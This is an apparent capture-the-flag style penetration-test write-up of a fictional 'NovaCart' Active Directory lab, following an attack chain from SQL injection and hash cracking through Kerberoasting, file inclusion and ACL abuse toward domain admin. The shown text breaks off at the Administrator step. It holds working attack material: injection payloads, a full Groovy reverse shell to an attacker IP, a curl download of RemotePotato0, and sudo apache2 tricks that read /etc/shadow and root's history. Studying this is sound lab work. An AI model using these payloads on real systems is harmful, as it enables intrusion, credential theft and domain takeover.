# NovaCart | Writeups

## Scenario

### Objective

NovaCart is an e-commerce company that operates a webshop for PC accessories. However, the entire platform is still under active development and expansion.

The IT team is currently working on a Linux-based version of the webshop as well as the development of a mobile app for NovaCart. The team is focused on adding features quickly, and has not prioritized security.

We have been tasked with conducting a penetration test to thoroughly assess the environment, identify vulnerabilities, and evaluate the overall security of the system.

### Initial Access

The client has provided you with VPN access to their internal network, but no credentials.

## Summary

In NovaCart, we begin without credentials, identifying a Windows-based Domain Controller hosting IIS web services on ports `80` and `5000`, Jenkins on port `8080`, and the full suite of AD services across the `novacart.local` domain. Initial enumeration of the shop application uncovers a SQL injection vulnerability in the search endpoint, which we exploit via SQLMap to dump the `NovaCart` database and recover salted hashes for four users. Cracking these with Hashcat mode `1420` yields valid credentials for `j.paul` and `d.barowski`, granting SMB access and revealing an internal Shares directory containing IT tickets, a Jenkins backup log, and a `web.config` file disclosing role-based access restrictions on the port `5000` application.

BloodHound enumeration exposes `d.barowski`'s `GenericWrite` over `j.bronski`, which we abuse through a targeted Kerberoasting attack to crack `j.bronski`'s password and access the CI/CD Pipeline Management portal on port `5000`. From there, a Local File Inclusion vulnerability in the `view.aspx` file parameter allows us to read `C:\ProgramData\Jenkins\jenkins.ini` and recover Jenkins credentials, which we leverage through the Jenkins Script Console to execute a Groovy reverse shell as `svc_jenkins`. With an interactive foothold established, we exploit the lingering AutoLogon configuration disclosed in ticket 120 by deploying `RemotePotato0` against the active `j.dillon` desktop session, relaying NTLM authentication through socat to capture and crack the user's NTLMv2 hash offline.

A second BloodHound enumeration reveals `j.dillon`'s `WriteOwner` over the IT Helpdesk group, which we chain via `bloodyAD` to assign ownership, grant `GenericAll`, add ourselves as a member, and inherit `ForceChangePassword` rights to reset `l.thompson`'s password, after which `d.barowski`'s IT Support membership is leveraged to clear the `ACCOUNTDISABLE` UAC flag and obtain a WinRM session yielding the user flag. Recycle bin forensics on the DC then surface a deleted `Groups_credentials.xml` containing credentials for `cliff.b`, whose membership in the Directory Ops group allows us to trigger the SYSTEM-level `Configure-OUDelegation` scheduled task through a pre-existing PowerShell helper, granting write permissions over the `Senior Dev Ops` OU. We move `m.mignola` and the other `Senior Dev Ops` users into the `Dev Ops` OU using an LDIF modification, reset `m.mignola`'s password, and pivot via RDP into a WSL Linux environment as `svc_unix`.

Inside WSL, an email on the desktop discloses password reuse by `andrew.collins` and confirms the MySQL `root` password matches the user's password, which we use with a `sudo` misconfiguration on `/usr/sbin/apache2` to read `/root/.bash_history` and recover `andrew.collins`'s domain password. With `andrew.collins` we reset `m.brown`'s password to leverage `AllowedToDelegate` on the DC, but constrained delegation against `Administrator` is blocked, so we pivot to `m.ibabao`, first using `p.bruce`'s `AddMember` permission on the Protected Users group via `bloodyAD` to remove `m.ibabao` from the group and bypass NTLM restrictions. Impersonating `m.ibabao` through `getST.py`, we abuse the Exchange Operations group's `WriteDACL` over the Users container to grant ourselves `DCSync`, dump domain secrets via `secretsdump.py`, and authenticate as Administrator through evil-winrm and retrieval of the final flag at `C:\Users\Administrator\Desktop\root.txt`.

## Recon

We use `rustscan -b 500 -a novacart.hsm --top -- -sC -sV -Pn` to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

```bash
rustscan -b 500 -a novacart.hsm --top -- -sC -sV -Pn
```

The target `10.0.20.22` is a Windows-based Domain Controller. It hosts a Microsoft IIS 10.0 web server on port `80` (serving the "NovaCart | Premium PC Components & Gaming Systems" site), as well as an additional web service on port `5000` (IIS, NTLM-authenticated). DNS is exposed on port `53` and Kerberos on port `88`, confirming the host's role as an Active Directory DC for the domain `novacart.local`. LDAP and LDAPS services are available on ports `389`, `636`, `3268`, and `3269`. SMB is exposed via ports `139` and `445` with message signing enabled and required. Remote management and access are available through RDP on port `3389` and WinRM on port `5985`. The host also exposes a .NET Message Framing service on port `9389`, RPC over HTTP on ports `593` and `49676`, and several MSRPC endpoints on ports `135`, `49664`, `49665`, `49666`, `49667`, `49668`, `49673`, `49677`, `49696`, `49703`, and `49719`.

## HTTP 80

We will continue enumerating the web services, starting with the one on port `80`. As mentioned at the beginning, this is serving the NovaCart | Premium PC Components & Gaming Systems site hosted on IIS.

```
http://novacart.local/
```

We visit every single page and find a search bar on the shop page.

```
http://novacart.local/shop.aspx
```

We test for SQL injection using the payload `'` and receive an error. This is a strong indication that the site is vulnerable to SQL injection.

```
http://novacart.local/search.aspx?q='
```

We are attempting to confirm our assumption using the following two payloads.

The first payload we try to inject `' AND 1=2 -- -`, appending a condition that always evaluates to `false`, which should return no results. By comparing this response against a true condition such as `1=1`, we can confirm whether user input is being passed directly to a SQL query without sanitisation.

For the following we do not receive any entries which evaluates always to false.

```
http://novacart.local/search.aspx?q='+AND+1=2+--+-
```

But with the next, we do get all the results confirming SQL injection. We keep that in mind, since we will will initially enumerate each service first.

```
http://novacart.local/search.aspx?q='+AND+1=2+--+-
```

## HTTP 5000

On the web service on port `5000` we are greeted with a basic HTTP authentication mask. So whenever we get retrieve some credentials we should try them here to uncover whats hidden beneath it.

```
http://novacart.local:5000/
```

## HTTP 8080

On port `8080` Jenkins is hosted, and requires also a username and password. So also here, if we retreive any credentials we should also try them here.

```
http://novacart.local:8080/login?from=%2F
```

## SMB

Next, we try to authenticate as `guest` via NetExec on SMB, but without success. Nevertheless we can derive the correct hosts entries with the following command:

```bash
nxc smb novacart.hsm -u guest -p '' --generate-hosts-file hosts
```

We replace our inital entry for the `/etc/hosts` file with the following:

```
10.0.20.22     DC.novacart.local novacart.local DC
```

## Access as j.paul & d.barkowski

We head back to the shop hosted on port `80`, and test for UNION based injection attacks manually. And are able to determine that 5 columns are present in the query, confirmed by the `ORDER BY 5` payload returning a valid response while `ORDER BY 6` causes an error.

```
http://novacart.local/search.aspx?q=' ORDER BY 5 -- -
```

```
http://novacart.local/search.aspx?q=' ORDER BY 6 -- -
```

We attempt a `UNION ALL SELECT` with integer placeholders across all 5 columns, however the application returns runtime errors indicating data type mismatche, suggesting that certain columns expect non-integer types such as `VARCHAR` or `NVARCHAR`, requiring us to adjust our payload accordingly. Before we continue with that we move on with a tool-based approach using SQLMap.

```
http://novacart.local/search.aspx?q=' UNION ALL SELECT 1,2,3,4,5 -- -
```

We pass the vulnerable search endpoint to SQLMap, allowing the tool to automatically detect and confirm the SQL injection vulnerability, identify the backend database type and dump the database. SQLMap is able to identify that the field is vulnerable to stacked queries and UNION based injection payloads. The types required can be determined by the output below:

```bash
sqlmap -u 'http://novacart.local/search.aspx?q=test'
```

Next, we query the databases present and detect the DB `NovaCart`.

```bash
sqlmap -u 'http://novacart.local/search.aspx?q=test' --dbs
```

Now we try to dump the tables of `NovaCart` and the most interesting one is the `users` table.

```bash
sqlmap -u 'http://novacart.local/search.aspx?q=test' -D NovaCart --tables
```

Next, we dump the `users` table and are able to retrieve 4 users and their corresponding hashes.

```bash
sqlmap -u 'http://novacart.local/search.aspx?q=test' -D NovaCart -T users --dump
```

Those are salted hashes:

```bash
hashid 'REDACTED'
```

From the Hashcat example pages we derive the different types possible...

... and try each. We are successful with mode `1420` and are able to crack the hashes of `j.paul` and `d.barwoski`.

```bash
hashcat -a0 -m1420 hashes.txt /usr/share/wordlists/rockyou.txt
```

We take a note of the credentials.

```
j.paul:<REDACTED>
d.barowski:<REDACTED>
```

We are able to authenticate with both users via SMB and are able to spot an interesting share called `Shares` of which both users are able to read.

```bash
nxc smb novacart.local -u 'j.paul' -p 'REDACTED' --shares
```

```bash
nxc smb novacart.local -u 'd.barowski' -p 'REDACTED' --shares
```

## Shares Enumeration

Next, we connect to the share using impackets `smbclient.py`. We are able to detect three foolders...

```bash
smbclient.py j.paul@DC.novacart.local
```

```bash
use Shares
```

... we visit each...

... and get all the files. The most interesting ones are the `web.config` possible containing sensitive data and...

... we retrieve all the tickets from `IT_Tickets`.

The following tickets are the most interesting ones.

Ticket 101 mentions a Jenkins config.

Ticket 120 mentions, that `j.dillion` is no longer member of the IT Team, and the AutoLogon configuration is still present on the Domain Controller and should be removed. Also it mentions that the user might have some elevated permssions that need to be removed. We take a note of all findings here.

The AutoLogon configuration stores credentials in plaintext within the registry, which combined with `j.dillion`'s potentially elevated permissions, could allow us to recover their credentials and leverage them for privilege escalation or lateral movement within the `novacart.local` domain.

Futhermore ticket 111 mentions that `cliff.b` has some missing access permissions that are required for the `Senior DevOps` role. As a workaround a Powershell script can be implemented to assign the permissions. This could open up an opportunity to abuse overly permissive script execution policies or hijack the script itself, potentially leading to privilege escalation or the assignment of unintended permissions within the domain. Let's see what we will find later, if those scripts are present.

Within the Backup directory we discover an event log file `Backup-Jenkins-Failure.evtx` which reveals the location of an internal Jenkins installation. We might require that later.

## Bloodhound Enumeration

We've already gathered quite a bit of valuable information. Next, we'll use the credentials we've obtained to enumerate the domain using Bloodhound.

```bash
bloodhound-ce.py --zip -c All -d novacart.local -u j.paul -p 'password123' -dc DC.novacart.local -ns 10.0.20.22
```

We ingest the data and look up the two users to which we have gained access. User `d.barwoski` seems more interesting as they have `GenericWrite` permissions over four users. This permission would enable us to carry out a targeted Kerberoast attack and obtain the hashes of those users, which we could then try to crack.

We query for shortest path from owned objects, confirming only those four users as the next option. But also it reveals that the user `j.bronski` is member of the `webapp operators` group. So this might be our next target. We know of at least two other web services we might gain access with that user.

Next, we query for the shortest path to Domain Admins and uncover several paths, among which one stands out: From `andrew.collins` to `m.brown`. The user `andrew.collins` holds the ability to change the password of `m.brown`, and `m.brown` has the `AllowedToDelegate` permission on the DC machine, which would theoretically allow impersonation of the Administrator account. We mark both `andrew.collins` and `m.brown` as high value targets and proceed to determine whether they are reachable.

We are only able to identify the Administrator account as the sole Domain Admin. We shift our focus to gaining initial access as `j.bronski`, with the intention of returning to BloodHound later should we be able to explore alternative privilege escalation paths beyond Active Directory and get access to another user than `j.bronski`.

## Access as j.bronski

Recalling the `web.config` we know which roles is allowed to access a certain site. So maybe with `j.bronski` we are able to access the page hosted on port `5000`.

```
web.config
```

We now focus on the escalation path identified in BloodHound:

Through BloodHound we identify that `d.barowski` holds `GenericWrite` permissions over `j.bronski`, which allows us to perform a Targeted Kerberoasting attack by setting a Service Principal Name (SPN) on `j.bronski`'s account and subsequently requesting and cracking their Kerberos service ticket offline to recover their plaintext password.

We run the following command and are able to get the Kerberos 5, etype 23, TGS-REP blob of the several users, among them `j.bronski`.

```bash
targetedKerberoast.py -d 'novacart.local' -u 'd.barowski' -p 'REDACTED' --dc-ip DC.novacart.local
```

We use hashcat to crack the blob and are able to retrieve the password of `j.bronski`.

```bash
hashcat -a0 -m13100 j.bronski.hash /usr/share/wordlists/rockyou.txt
```

We test the credentials using NetExec. We successfully authenticated.

```bash
nxc smb novacart.local -u 'j.bronski' -p 'REDACTED' --shares
```

## Access as j.bronski (CI/CD Pipeline Managemnt HTTP 5000)

We visit the site at port `5000` again and try to log in.

```
http://novacart.local:5000
```

We can log in and access the CI/CD Pipeline Management site. We can deduce several pieces of information. For example, we can see that the user running Jenkins is called `svc_jenkins`. Furthermore, version `2.528.3` is in use. The DC is a Windows Server 2019.

Scrolling down, we also see that there might be a WSL instance running with OpenSSH available. This might be run by a service user called `svc_unix`.

Navigating to the IT Team Management Portal reveals that the page is loaded via a `file` parameter in the endpoint `http://novacart.local:5000/view.aspx?file=it_team.aspx`, which might be vulnerable to Local File Inclusion as it seems like local files are included to load.

```
http://novacart.local:5000/view.aspx?file=it_team.aspx
```

We try to include a file that is not present and we see the following error revealing the path of the application.

```
http://novacart.local:5000/view.aspx?file=test
```

To confirm the Local File Inclusion vulnerability, we attempt to traverse the directory structure using `../../windows/win.ini` as the file parameter. The file `win.ini` is a benign, world-readable Windows file that we can use to validate path traversal on Windows hosts. And we are able to include it.

```
http://novacart.local:5000/view.aspx?file=../../windows/win.ini
```

Recalling the event log file `Backup-Jenkins-Failure.evtx` we have the location of the Jenkins installation. So we could try to include the Jenkins config files to eventually read sensitive information like the credentials used.

We include the `jenkins.ini` file and are able to retreive the credentials being used for Jenkins.

```
C:\ProgramData\Jenkins\jenkins.ini
```

```
http://novacart.local:5000/view.aspx?file=../../ProgramData/Jenkins/jenkins.ini
```

## Access as jbronski (Jenkins HTTP 8080)

Next we head to the Jenkins log in portal and log in with the credentials gathered via the LFI.

```
http://novacart.local:8080/login?from=%2F
```

We are able to authenticate.

## Shell as svc\_jenkins

With access to the Jenkins Script Console, we can attempt to leverage Groovy script execution to run system commands on the host. Since the CI/CD page revealed the service is running as `svc_jenkins`, any command execution through the console would proably be performed in the context of that account, making it a viable path to obtaining a reverse shell on the machine.

```
http://novacart.local:8080/script
```

We will use the following payload by HackViser and adapt port and ip:

```groovy
// Windows reverse shell
String host="10.200.50.148";
int port=4445;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

We run a listener using Penelope to catch our reverse shell `penelope -p 4445` and run the script.

```
http://novacart.local:8080/script
```

We get a connection back and are indeed `svc_jenkins`.

```
novacart\svc_jenkins
```

## Access as j.dillon

Now with an interactive session we recall the finding from ticket 120 and check if AutoLogon is present and try to retrieve some cleartext credentials.

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

While the output confirms that `AutoAdminLogon` is enabled(`AutoAdminLogon REG_SZ 1)` and `j.dillion` is set as the `DefaultUsername`, but the `DefaultPassword` value is not returned.

This involves a degree of assumption, however if `j.dillion` is currently logged into the machine, we can attempt to hijack their session using the `RemotePotato0` exploit.

We support this assumption by listing all running processes matching `explorer.exe.` Since the `explorer.exe` is the Windows shell process that spawns when a user logs into a graphical desktop session, its presence in the output should confirm an interactive user session being active. The output reveals a session running under Session `1`, implying that a user is currently logged into the host with an active desktop session, but we can't determine who it is.

```bash
tasklist /v /fi "imagename eq explorer.exe"
```

With the active user identified, the next step is to hijack their session, not by interacting with it directly, but by stealing the credential material backing it. Since we already hold code execution on the target as `svc_jenkins`, we can coerce the logged-on user into authenticating against a listener we control and capture their NTLMv2 hash in transit. A well-suited tool for exactly this scenario is `RemotePotato0`:

`RemotePotato0` abuses the DCOM activation service to coerce an authenticated user's NTLM authentication, capturing their NTLMv2 hash by spinning up a rogue DCOM server and redirecting the authentication to an attacker-controlled listener such as `responder`. This requires an existing foothold on the target machine... which we have as `svc_jenkins`. As well as `responder` running on the attacking machine to capture the relayed hash. The resulting NTLMv2 hash can then be taken offline and cracked, or potentially used directly in a Pass-the-Hash attack, allowing us to authenticate as `j.dillion` and leverage their elevated permissions within the domain.

We download the tool and get it on the machine. Fortunately Microsoft Defender does not detect it, even though is a known exploit and Microsoft Defender is running.

```bash
curl http://10.200.50.148/RemotePotato0.exe -o RemotePotato0.exe
```

Next, we set up socat as follows

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.20.22:9999
```

And run the exploit.

```bash
.\RemotePotato0.exe -m 2 -s 1 -x 10.200.50.148 -p 9999
```

We retreive the hash of `j.dillon`.

Next, we try to crack it using hashcat and are successful.

```bash
hashcat -a0 -m5600 j.dillon.hash /usr/share/wordlists/rockyou.txt
```

We test the credentials using NetExec. We successfully authenticated.

```bash
nxc smb novacart.local -u 'j.dillon' -p 'REDACTED' --shares
```

## Bloodhound Enumeration II

With `j.dillon` now owned, we return to BloodHound and mark the user as owned. We see that `j.dillon` holds `WriteOwner` permissions over the `IT Helpdesk` group. This allows us to assign ourselves as the group owner, granting the ability to modify group membership and subsequently add `j.dillon` to the group, inheriting any permissions and access rights associated with the `IT Helpdesk` role within the domain.

Enumerating the permissions associated with the `IT Helpdesk` group reveals that it holds `ForceChangePassword` permissions over several domain user accounts. Tthis allows any member of the group to reset the passwords of those users without knowing their current credentials, granting us the ability to take over those accounts and further expand our foothold within the `novacart.local` domain.

Next we query for the shortest path from our owned objects. We can leverage `j.dillion`'s `WriteOwner` permission on the `IT Helpdesk` group, with that we can assign ownership to `j.dillion` and subsequently grant `GenericAll` rights to the group, allowing us to add `j.dillion` as a member. With group membership established and the `ForceChangePassword` permission inherited, we are able to reset the password of `l.thompson` that is member of the remote management users group allowing us to get a remote session via evil-winrm.

## Shell as l.thompson

We follow the depticted attack path from before.

First we exploit the `WriteOwner` permission using `bloodyAD` to assign ownership of the `IT Helpdesk` group to `j.dillon`.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u j.dillon -p 'REDACTED' set owner 'it helpdesk' j.dillon
```

Next, we grant us `GenericAll` permissions over that group...

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u j.dillon -p 'REDACTED' add genericAll 'it helpdesk' 'j.dillon'
```

... and add us as a member.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u j.dillon -p 'REDACTED' add groupMember 'it helpdesk' 'j.dillon'
```

Now we are able to change the password of `l.thompson`.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u j.dillon -p 'REDACTED' set password  'l.thompson' 'Pwned123@!'
```

After changing the credentials we try to authenticate agains SMB using NetExec, but the account is disabled.

```bash
nxc smb novacart.local -u 'l.thompson' -p 'Pwned123@!'
```

To resolve this, we query for writable objects across our compromised accounts using `bloodyAD` to determine whether any of them hold permissions to re-enable the account.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u j.dillon -p 'REDACTED' get writable
```

Checking `d.barowski`'s writable objects, we find that the account is a member of the `IT Support` group, which may carry sufficient permissions to modify user account properties such as re-enabling the disabled account.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u d.barowski -p 'REDACTED' get writable
```

With writable permissions confirmed via `d.barowski`, we use `bloodyAD` to remove the `ACCOUNTDISABLE` flag from `l.thompson`'s User Account Control (UAC) attributes, which re-enables the account and allowing us to proceed with authentication.

```bash
bloodyAD --host  DC.novacart.local -d 'novacart.local' -u 'd.barowski' -p 'kubarow' remove uac 'l.thompson' -f ACCOUNTDISABLE
```

We test the credentials again using NetExec. This time we successfully authenticated.

```bash
nxc smb novacart.local -u 'l.thompson' -p 'Pwned123@!' --shares
```

Next, we try to get a remote session via evil-winrm and succesfully logged in. We find the user flag at `C:\Users\l.thompson\Desktop\user.txt`.

```bash
evil-winrm -i DC.novacart.local -u 'l.thompson' -p 'Pwned123@!'
```

## Access as cliff.b ... and others

Using our remote session via evil-winrm as user `j.dillon`, we enumerate the target again and find a PowerShell history file.

Some email message files were deleted and also a `Groups_credential.xml`.

We look for those email message files and spot the correct recycle bin location.

```bash
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include *.eml,Groups_credentials.xml
```

We recover those and get them to our attacker machine.

```bash
Copy-Item 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129\$IXJMTOZ.eml' IXJMTOZ.eml
```

```bash
Copy-Item 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129\$RXJMTOZ.eml' RXJMTOZ.eml
```

```bash
download IXJMTOZ.eml
```

```bash
download RXJMTOZ.eml
```

It is a mail to Louis asking to delete all credentials, backups and files connected to the `Directory Ops` group.

```
Hello Louis,

Following your recent transfer to another department and your departure from the IT team, please ensure that all permissions previously assigned to you are reset accordingly.

Additionally, I ask that you remove any notes, stored data, or documentation you may still have related to the **Directory OPS** group.

If there are any files, backups, or credentials connected to this group on your workstation or personal directories, please delete them as part of the cleanup process.

Let me know once this has been completed.

Best regards,
Administrator
```

We take another look into the recycle bin and also spot a bigger xml file.

```bash
ls 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129'
```

We recover it and get it to our machine.

```bash
Copy-Item 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129\$RY0735O.xml' RY0735O.xml
```

```bash
download RY0735O.xml
```

The file contains several credentials. Among them for three users.

```bash
cat RY0735O.xml
```

We test all three credential pairs via SMB using NetExec and are able to authenticate with all of them.

```bash
nxc smb novacart.local -u 'cliff.b' -p 'REDACTED'
```

Recalling our BloodHound data we can determine that the most interesting target is the user `cliff.b` with `GenericAll` permissions over two users and the `Dev Ops OU` through the `Directory Ops` group.

## Elevating Privilges of cliff.b

We recall the ticket 111 which mentioned that `cliff.b` has some missing access permissions that are required for the `Senior DevOps` role. As a workaround Powershell script can be implemented to assign the permissions. This could open up an opportunity to abuse overly permissive script execution policies or hijack the script itself, potentially leading to privilege escalation or the assignment of unintended permissions within the domain.

Furhtermore we see in the group description of the `Directory Ops` group that this groups has full control over the `Dev Ops OU` but not the `Senior Dev Ops OU`.

Fortunately, `cliff.b` is also a member of the remote management users group. So we can establish a session with that user using evil-winrm.

Let's see if we can find the workaround using `cliff.b`'s session and, if possible, make use of it.

```bash
evil-winrm -i novacart.local -u 'cliff.b' -p 'REDACED'
```

The `check_ou_permissions.ps1` queries the Access Control Lists on two OUs (`Senior Dev Ops` and `Dev Ops`) and filters for any ACEs (Access Control Entries) belonging to the `Directory Ops` group. This tells us what permissions that group already has on those OUs.

`check_ou_permissions.ps1`

```powershell
Import-Module ActiveDirectory

$group = "Directory Ops"

$ous = @(
    "OU=Senior Dev Ops,DC=novacart,DC=local",
    "OU=Dev Ops,DC=novacart,DC=local"
)

foreach ($ou in $ous) {

    Write-Host "`n===== Checking OU: $ou =====" -ForegroundColor Cyan

    try {
        $acl = Get-Acl "AD:$ou"

        foreach ($ace in $acl.Access) {
            if ($ace.IdentityReference -like "*$group*") {
                Write-Host "Match found!" -ForegroundColor Green
                Write-Host "Principal : $($ace.IdentityReference)"
                Write-Host "Rights    : $($ace.ActiveDirectoryRights)"
                Write-Host "Type      : $($ace.AccessControlType)"
                Write-Host "Inherited : $($ace.IsInherited)"
                Write-Host "-----------------------------------"
            }
        }
    }
    catch {
        Write-Host "OU not found or access error: $ou" -ForegroundColor Red
    }
}
```

The `Configure-OUDelegation.ps1` is the most valuable script for us. It connects to the Windows Task Scheduler COM interface and runs a pre-existing SYSTEM-level task called `Configure-OUDelegation`. If that task grants delegation rights to `Directory Ops` members over the `Senior Dev Ops OU`, this elevates privileges...

> Triggers a SYSTEM-level scheduled task that modifies permissions on the Senior Dev Ops OU, granting rights to members of the Directory Ops group.

`Configure-OUDelegation.ps1`

```powershell
# Triggers a SYSTEM-level scheduled task that modifies permissions on the Senior Dev Ops OU, granting rights to members of the Directory Ops group.

$service = New-Object -ComObject "Schedule.Service"
$service.Connect()

$task = $service.GetFolder("\").GetTask("Configure-OUDelegation")
$task.Run($null)
```

And with `enum_ou_groups.ps1`we can enumerate every user in both OUs and dumps their full group memberships. This maps out who can be targeted or impersonated once elevated access is obtained.

`enum_ou_groups.ps1`

```powershell
Import-Module ActiveDirectory

# Ziel-OUs
$ous = @(
    "OU=Senior Dev Ops,DC=novacart,DC=local",
    "OU=Dev Ops,DC=novacart,DC=local"
)

foreach ($ou in $ous) {

    Write-Host "`n===== OU: $ou =====" -ForegroundColor Cyan

    try {
        $users = Get-ADUser -SearchBase $ou -Filter * -Properties MemberOf

        foreach ($user in $users) {

            Write-Host "`nUser: $($user.SamAccountName)" -ForegroundColor Yellow

            if ($user.MemberOf) {
                foreach ($group in $user.MemberOf) {
                    Write-Host "  -> $group"
                }
            } else {
                Write-Host "  -> No group memberships"
            }
        }
    }
    catch {
        Write-Host "Error accessing OU: $ou" -ForegroundColor Red
    }
}
```

So first we check our permissions and enum the OU groups and see we have `GenericAll` permissions over the `Dev Ops` OU and we are able to see all the users beloning to the OUs.

```bash
./check_ou_permissions.ps1
```

```bash
./enum_ou_groups.ps1
```

Now we leverage the `Configure-OUDelegation.ps1` and check the permissions again.

We now have write persmissions over the `Senior Dev Ops` OU.

```bash
./Configure-OUDelegation.ps1
```

```bash
./check_ou_permissions.ps1
```

The following users are member of the `Senior Dev Ops` OU. Since we now have `GenericWrite` permissions over those users we can perform a targeted Kerberoast attack.

## Bloodhound Enumeration III

With `p.bruce` and `l.forate` being members of the `Identity_Admins` group, and that group holding permissions to manage membership of `protected users` group, we are able to add and remove users from this group. So being in that `protected users` group prevent certain authentication methods, so by removing a target user from the protected group we can strip those restrictions and authenticate against them via NTLM, opening up further lateral movement opportunities within the domain. This is not required now in our identitfied attack path but might come in handy later.

The most interesting of the three users is `m.mignola`, as the account holds membership in both the `Remote Desktop Users` group and the `unix_support` group.

## Access as m.mignola

We perform a Targeted Kerberoasting attack and successfully retrieving their Kerberos 5, etype 23, TGS-REP blobs offline for cracking.

```bash
targetedKerberoast.py -d 'novacart.local' -u 'cliff.b' -p 'REDACTED' --dc-ip dc.novacart.local
```

Next, we try to crack them but are unsuccessful.

```bash
hashcat -a0 -m13100 targetedKerberoast.hashes  /usr/share/wordlists/rockyou.txt
```

Since that did not work out, we have to find another way to get access to. `m.mignola`.

We do have `GenericAll` permissions over the `Dev Ops` OU. So the idea is to move the users from the `Senior Dev Ops` OU to the `Dev Ops` OU. This should also work, cause we have now the `GenericWrite` permission over those users through the `Configure-OUDelegation.ps1` script.

We already did something similar in City Council:

For convienience and the possiblity to make use of the AddMember permission to the `protected users` group we move all users from the `Senior Dev Ops` OU to the `Dev Ops` OU.

We prepare an LDIF file to move the users from the `Senior Dev Ops` OU to the `Dev Ops` OU.

```bash
cat <<EOF > move.ldif
dn: CN=LUIS FORTA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL
changetype: moddn
newrdn: CN=LUIS FORTA
deleteoldrdn: 1
newsuperior: OU=DEV OPS,DC=NOVACART,DC=LOCAL

dn: CN=MIKE MIGNOLA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL
changetype: moddn
newrdn: CN=MIKE MIGNOLA
deleteoldrdn: 1
newsuperior: OU=DEV OPS,DC=NOVACART,DC=LOCAL

dn: CN=PAUL BRUCE,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL
changetype: moddn
newrdn: CN=PAUL BRUCE
deleteoldrdn: 1
newsuperior: OU=DEV OPS,DC=NOVACART,DC=LOCAL
EOF
```

Next, we execute the LDAP modification to move the users.

```bash
ldapmodify -H ldap://dc.novacart.local \
  -D 'cliff.b@novacart.local' \
  -w 'REDACTED' \
  -f move.ldif
```

After moving the accounts to the `Senio Dev Ops` OU, we leverage our `GenericAll` privileges over that OU to reset the password of the `m.mignola` user, allowing us to take control of the account.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u cliff.b -p 'REDACTED' set password  'm.mignola' 'Pwned123@!'
```

We test the credentials using NetExec. We successfully authenticated.

```bash
nxc smb novacart.local -u 'm.mignola' -p 'Pwned123@!' --shares
```

## Access as svc\_unix

Next, we RDP into the target machine as `m.mignola` with the set password. And the Desktop already reveals alot.

In the recycle bin we find some old emails and a ssh shortcut. We can recover this and get access to the WSL instance.

Further more there is a private SSH key lying arround.

The app seems to be just cosmetic.

We open the mail on the desktop, we get a prompt but ignore it and select No.

The mail contains some valuable information. First of all we get a hint that the user andrew.collins might re-use them passwords. The service / the app is running locally and the database connection is not yet implemented and we should have access to the MySQL configuration directory. The password set for the database is the same as the users password.

```
as discussed, the WSL Linux environment remains part of our workflow for testing NovaCart components under Linux. The database is running locally within WSL to simulate real-world conditions in an isolated setup.

We are also testing the webshop on a local Apache server (port 8000), strictly for internal development.

Administrative access to the Linux root account is managed by Andrew Collins. For root credentials, please contact him directly at:
andrew.collins@novacart.local

Hopefully, he didn’t reuse the same password for other accounts this time.

No external SSH access is required — all connections should be performed locally.

Update:

An initial version of the NovaCart Mobile App has been developed. The database connection is not yet implemented, and the current products are only dummy entries to demonstrate the intended layout.

We will begin proper testing once the app is connected to the local MySQL database within the WSL environment.

You have access to the MySQL directory and configuration files, and you can connect to the database to insert product data and perform testing. I have set your current user password as the database password. Please make sure to change it upon your first login.

Best regards,
Administrator
NovaCart IT Operations
```

We restore the ssh link from recycle bin and run it. We have access as `svc_unix`.

We open the `mysql.cnf` file and find the database password.

```
/etc/mysql/mysql.cnf
```

We run `sudo -l` and enter the found password. It is indeed the same password as the database password. We are able to run `/usr/sbin/apache2` with root permissions using sudo.

```bash
sudo -l
```

We can leverage that to read files as `root`.

```bash
sudo /usr/sbin/apache2 -f /etc/shadow
```

We can for example get the hash of the root user...

```bash
sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /etc/shadow'
```

... but takes to long to crack.

```bash
hashcat -a0 -m1800 root.hash /usr/share/wordlists/rockyou.txt
```

Other interesting files are the .`bash_history` file of the `root` user. And we spot a password.

```bash
sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/.bash_history'
```

From mail we know multiple password reuse by `andrew.collins`, we could now craft a wordlist of users and perform a password spray, but for now we test the credentials for `andrew.collins` alone and are able to authenticate

```bash
nxc smb novacart.local -u 'andrew.collins' -p 'administrator38' --shares
```

We mark the user as owned. That user is allowed to change passwords of multiple users...

We query for shortest path to domain admins and see that m.brown has `allowedToDelegate` permissions over the DC and we can change the password of that user with `andrew.collins`. This would allow us to impersonate the Administrator. Let's give it a try.

## Access as m.brown

First we change the password of the user `m.brown`.

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u andrew.collins -p 'REDACTED' set password  'm.brown' 'Pwned123@!'
```

We test the credentials and are able to authenticate.

```bash
nxc smb novacart.local -u 'm.brown' -p 'Pwned123@!' --shares
```

## Access as Administrator

So we recall the path from before.

